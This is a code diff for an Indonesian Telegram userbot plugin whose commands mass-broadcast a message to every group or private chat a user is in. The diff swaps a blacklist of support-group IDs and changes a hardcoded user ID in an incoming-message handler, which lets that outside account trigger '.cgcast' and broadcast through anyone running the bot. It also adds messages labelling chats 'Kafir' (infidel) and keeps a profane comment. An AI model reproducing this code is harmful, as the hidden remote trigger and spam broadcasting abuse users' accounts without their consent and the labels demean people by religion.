@@ -11,28 +11,36 @@
 # t.me/SharingUserbot & t.me/Lunatic0de
 
 from userbot import CMD_HELP, CMD_HANDLER as cmd
-from userbot.utils import edit_or_reply, edit_delete, kyy_cmd
+from userbot.utils import edit_or_reply, edit_delete, joo_cmd
 from userbot.events import register
 
 # KALO FORK/CLONE ID GC DI BAWAH G USH DI HAPUSS YAA KONTOLL
 
 GCAST_BLACKLIST = [
-    -1001380293847,  # NastySupport
     -1001473548283,  # SharingUserbot
-    -1001578091827,  # PrimeSupportGroup
-    -1001752592753,  # SkyzuSupport
-    -1001430568914,  # FlicksSupport
-    -1001267233272,  # PocongUserbot
-    -1001489233533,  # RumahKitaro
-    -1001318051930,  # Gatau GC mana
-    -1001433478384,  # anjay saya bohong
-    -1001688172956,  # ga kekinian support
+    -1001433238829,  # TedeSupport
+    -1001476936696,  # AnosSupport
+    -1001327032795,  # UltroidSupport
+    -1001294181499,  # UserBotIndo
+    -1001419516987,  # VeezSupportGroup
+    -1001459812644,  # GeezSupportGroup
+    -1001296934585,  # X-PROJECT BOT
+    -1001481357570,  # UsergeOnTopic
+    -1001459701099,  # CatUserbotSupport
+    -1001109837870,  # TelegramBotIndonesia
+    -1001752592753,  # Skyzusupport
+    -1001687155877,  # CilikSupport
+    -1001380293847,  # NastySupport
+    -1001664518224,  # JoniSupport
+    -1001606097524,  # SanjoSupportt
+    -1001554560763,  # Vegeta Supports
+    -1001692751821,  # RamSupportGroup
 
 ]
 
 
-@kyy_cmd(pattern="gcast(?: |$)(.*)")
-@register(incoming=True, from_users=1663258664,
+@joo_cmd(pattern="gcast(?: |$)(.*)")
+@register(incoming=True, from_users=860951678,
           pattern=r"^\.cgcast(?: |$)(.*)")
 async def gcast(event):
     xx = event.pattern_match.group(1)
@@ -41,7 +49,7 @@ async def gcast(event):
     elif event.is_reply:
         msg = await event.get_reply_message()
     else:
-        return await edit_delete(event, "**Berikan Sebuah Pesan atau Reply**")
+        return await edit_delete(event, "**Berikan Sebuah Pesan Atau Reply**")
     kk = await edit_or_reply(event, "`Sedang Mengirim Pesan Secara Global... 📢`")
     er = 0
     done = 0
@@ -57,11 +65,11 @@ async def gcast(event):
             except BaseException:
                 er += 1
     await kk.edit(
-        f"**Berhasil Mengirim Pesan Ke** `{done}` **Grup, Gagal Mengirim Pesan Ke** `{er}` **Grup**"
+        f"**Berhasil Mengirim Pesan Ke** `{done}` **Grup Kafir, Gagal Mengirim Pesan Ke** `{er}` **Grup Alim**"
     )
 
 
-@kyy_cmd(pattern="gucast(?: |$)(.*)")
+@joo_cmd(pattern="gucast(?: |$)(.*)")
 async def gucast(event):
     xx = event.pattern_match.group(1)
     if xx:
@@ -69,7 +77,7 @@ async def gucast(event):
     elif event.is_reply:
         msg = await event.get_reply_message()
     else:
-        return await edit_delete(event, "**Berikan Sebuah Pesan atau Reply**")
+        return await edit_delete(event, "**Berikan Sebuah Pesan Atau Reply**")
     kk = await edit_or_reply(event, "`Sedang Mengirim Pesan Secara Global... 📢`")
     er = 0
     done = 0
@@ -82,7 +90,7 @@ async def gucast(event):
             except BaseException:
                 er += 1
     await kk.edit(
-        f"**Berhasil Mengirim Pesan Ke** `{done}` **chats, Gagal Mengirim Pesan Ke** `{er}` **chats**"
+        f"**Berhasil Mengirim Pesan Ke** `{done}` **Chat Kafir, Gagal Mengirim Pesan Ke** `{er}` **Chat Alim**"
     )
 
 
@@ -90,7 +98,7 @@ CMD_HELP.update(
     {
         "gcast": f"**Plugin : **`gcast`\
         \n\n  •  **Syntax :** `{cmd}gcast` <text/reply media>\
-        \n  •  **Function : **Mengirim Global Broadcast pesan ke Seluruh Grup yang kamu masuk. (Bisa Mengirim Media/Sticker)\
+        \n  •  **Function : **Mengirim Global Broadcast Pesan Ke Seluruh Grup Yang Kamu Masuk. (Bisa Mengirim Media/Sticker)\
     "
     }
 )
@@ -100,7 +108,7 @@ CMD_HELP.update(
     {
         "gucast": f"**Plugin : **`gucast`\
         \n\n  •  **Syntax :** `{cmd}gucast` <text/reply media>\
-        \n  •  **Function : **Mengirim Global Broadcast pesan ke Seluruh Private Massage / PC yang masuk. (Bisa Mengirim Media/Sticker)\
+        \n  •  **Function : **Mengirim Global Broadcast Pesan Ke Seluruh Private Massage / PC Yang Masuk. (Bisa Mengirim Media/Sticker)\
     "
     }
 )
